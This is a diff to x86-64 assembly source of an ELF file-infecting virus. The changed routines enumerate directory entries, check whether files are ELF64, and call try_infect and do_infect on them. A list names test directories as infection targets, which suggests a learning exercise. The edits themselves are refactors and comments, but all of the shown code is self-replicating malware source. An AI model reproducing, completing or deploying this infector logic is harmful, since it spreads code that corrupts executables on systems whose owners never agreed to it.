@@ -218,6 +218,9 @@ _start:
         add r13, rdx
         cmp al, DT_REG
         jne .next_file
+
+        mov rsi, rdi
+        mov rdi, r14
         call try_infect
     .next_file:
         cmp r13, r12
@@ -245,16 +248,18 @@ _start:
     pop rdi
     jmp rax
 
-; r14 = dirname, rdi = filename
+; void try_infect(rdi=char*, rsi=char*)
 try_infect:
+    push rsi
     push rdi
     lea rdi, [rel infect_msg]
     mov rsi, 7
     call write
     pop rdi
+    pop rsi
 
-    mov rsi, r14
-    mov rax, rdi
+    mov rax, rsi
+    mov rsi, rdi
     lea rdi, data(file_path)
     call get_full_path
 
@@ -331,7 +336,7 @@ is_elf64:
         cmp QWORD [rdi + 16], rdx
         jnz .return
     .ok:
-        mov rax, 1
+        mov rax, TRUE
     .return:
         ret
 
@@ -404,6 +409,7 @@ do_infect:
         ret
 
 ; void *get_base_address()
+; Gets the base address of the running process.
 get_base_address:
     lea rax, [rel _start]
     mov rdx, [rel virus_entrypoint]
@@ -459,7 +465,6 @@ exit:
     mov rax, SYS_EXIT
     xor rdi, rdi
     syscall
-; exit
 
 infect_directories:
     dq tmp_test, tmp_test2, 0
